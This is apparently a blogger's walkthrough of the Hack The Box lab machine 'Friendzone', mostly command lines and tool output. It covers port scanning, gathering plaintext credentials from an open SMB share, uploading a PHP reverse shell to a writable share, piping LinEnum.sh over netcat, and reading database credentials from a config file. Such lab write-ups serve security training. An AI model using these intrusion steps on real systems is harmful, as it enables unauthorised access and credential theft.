---
title: 'HTB Friendzone'
date: 2022-09-09 12:00:00
featured_image: '/images/htb/FriendZone.png'
excerpt: Armageddon
---


```bash
┌──(rafael㉿ragnarok)-[~/Desktop/htb/friendzone]
└─$ nmap -sC -sV -oA nmap/friendzone 10.10.10.123
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-06 15:48 CEST
Nmap scan report for 10.10.10.123
Host is up (0.042s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
21/tcp  open  ftp      vsftpd 3.0.3
22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)
|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)
|_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)
53/tcp  open  domain   ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Friend Zone Escape software
|_http-server-header: Apache/2.4.29 (Ubuntu)
443/tcp open  ssl/http Apache httpd 2.4.29
| tls-alpn: 
|_  http/1.1
|_http-title: 404 Not Found
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.29 (Ubuntu)
| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO
| Not valid before: 2018-10-05T21:02:30
|_Not valid after:  2018-11-04T21:02:30
Service Info: Host: 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.00 seconds
```

```shell
┌──(rafael㉿ragnarok)-[~/Desktop/htb/friendzone]
└─$ ftp 10.10.10.123 
Connected to 10.10.10.123.
220 (vsFTPd 3.0.3)
Name (10.10.10.123:rafael): anonymous
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
ftp> exit
221 Goodbye.
```

```bash
──(rafael㉿ragnarok)-[~/Desktop/htb/friendzone]
└─$ searchsploit vsftpd          
--------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                   |  Path
--------------------------------------------------------------------------------- ---------------------------------
vsftpd 2.0.5 - 'CWD' (Authenticated) Remote Memory Consumption                   | linux/dos/5814.pl
vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (1)                   | windows/dos/31818.sh
vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (2)                   | windows/dos/31819.pl
vsftpd 2.3.2 - Denial of Service                                                 | linux/dos/16270.c
vsftpd 2.3.4 - Backdoor Command Execution                                        | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                           | unix/remote/17491.rb
vsftpd 3.0.3 - Remote Denial of Service                                          | multiple/remote/49719.py
--------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

FTP open, needs creds.

![](/images/htb/friendzone_http.png.png]]


```bash
┌──(rafael㉿ragnarok)-[~/Desktop/htb/friendzone]
└─$ smbmap -H 10.10.10.123    
[+] Guest session       IP: 10.10.10.123:445    Name: 10.10.10.123                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        Files                                                   NO ACCESS       FriendZone Samba Server Files /etc/Files
        general                                                 READ ONLY       FriendZone Samba Server Files
        Development                                             READ, WRITE     FriendZone Samba Server Files
        IPC$                                                    NO ACCESS       IPC Service (FriendZone server (Samba, Ubuntu))
```

```bash
┌──(rafael㉿ragnarok)-[~/Desktop/htb/friendzone]
└─$ smbmap -H 10.10.10.123 -R --depth 5
[+] Guest session       IP: 10.10.10.123:445    Name: 10.10.10.123                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        Files                                                   NO ACCESS       FriendZone Samba Server Files /etc/Files
        general                                                 READ ONLY       FriendZone Samba Server Files
        .\general\*
        dr--r--r--                0 Wed Jan 16 21:10:51 2019    .
        dr--r--r--                0 Wed Jan 23 22:51:02 2019    ..
        fr--r--r--               57 Wed Oct 10 01:52:42 2018    creds.txt
        Development                                             READ, WRITE     FriendZone Samba Server Files
        .\Development\*
        dr--r--r--                0 Tue Sep  6 15:58:46 2022    .
        dr--r--r--                0 Wed Jan 23 22:51:02 2019    ..
        IPC$                                                    NO ACCESS       IPC Service (FriendZone server (Samba, Ubuntu))
```

```shell
┌──(rafael㉿ragnarok)-[~/Desktop/htb/friendzone]
└─$ smbclient //10.10.10.123/general 
Password for [WORKGROUP\rafael]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jan 16 21:10:51 2019
  ..                                  D        0  Wed Jan 23 22:51:02 2019
  creds.txt                           N       57  Wed Oct 10 01:52:42 2018

                9221460 blocks of size 1024. 6459236 blocks available
smb: \> get creds.txt
getting file \creds.txt of size 57 as creds.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)

```

```bash
┌──(rafael㉿ragnarok)-[~/Desktop/htb/friendzone]
└─$ cat creds.txt   
creds for the admin THING:

admin:WORKWORKHhallelujah@#
```

![](/images/htb/friendzone_portal.png.png]]



![](/images/htb/friendzone_https.png.png]]


![](/images/htb/friendzone_pagesource.png]]

![](/images/htb/friendzone_jsjs.png.png]]

```bash
┌──(rafael㉿ragnarok)-[/opt/Sublist3r]
└─$ ./sublist3r.py -d friendzone.red

                 ____        _     _ _     _   _____                                                               
                / ___| _   _| |__ | (_)___| |_|___ / _ __                                                          
                \___ \| | | | '_ \| | / __| __| |_ \| '__|                                                         
                 ___) | |_| | |_) | | \__ \ |_ ___) | |                                                            
                |____/ \__,_|_.__/|_|_|___/\__|____/|_|                                                            
                                                                                                                   
                # Coded By Ahmed Aboul-Ela - @aboul3la                                                             
                                                                                                                   
[-] Enumerating subdomains now for friendzone.red                                                                  
[-] Searching now in Baidu..
[-] Searching now in Yahoo..
[-] Searching now in Google..
[-] Searching now in Bing..
[-] Searching now in Ask..
[-] Searching now in Netcraft..
[-] Searching now in DNSdumpster..
[-] Searching now in Virustotal..
[-] Searching now in ThreatCrowd..
[-] Searching now in SSL Certificates..
[-] Searching now in PassiveDNS..
[!] Error: Virustotal probably now is blocking our requests

[-] Total Unique Subdomains Found: 1
administrator1.friendzone.red
```

![](/images/htb/friendzone_login.png.png]]![[/images/htb/etchosts.png.png]]![[/images/htb/haha.png.png]]

rev.php = php_reverse_shell

```bash
┌──(rafael㉿ragnarok)-[~/Desktop/htb/friendzone]
└─$ smbclient //10.10.10.123/Development
Password for [WORKGROUP\rafael]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Sep  6 15:58:47 2022
  ..                                  D        0  Wed Jan 23 22:51:02 2019

                9221460 blocks of size 1024. 6460336 blocks available
smb: \> put rev.php
putting file rev.php as \rev.php (32.7 kb/s) (average 32.7 kb/s)
```

![](/images/htb/dashboard.png.png]]

We've got reverse shell:

```bash
$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@FriendZone:/home/friend$ pwd
pwd
/home/friend
www-data@FriendZone:/home/friend$ cat user.txt

```

```bash
┌──(rafael㉿ragnarok)-[~/Desktop]
└─$ cat LinEnum.sh| nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.10.123] 57016
```

```bash
www-data@FriendZone:/var/www$ cat mysql_data.conf
cat mysql_data.conf
for development process this is the mysql creds for user friend

db_user=friend

db_pass=Agpyu12!0.213$

db_name=FZ
```

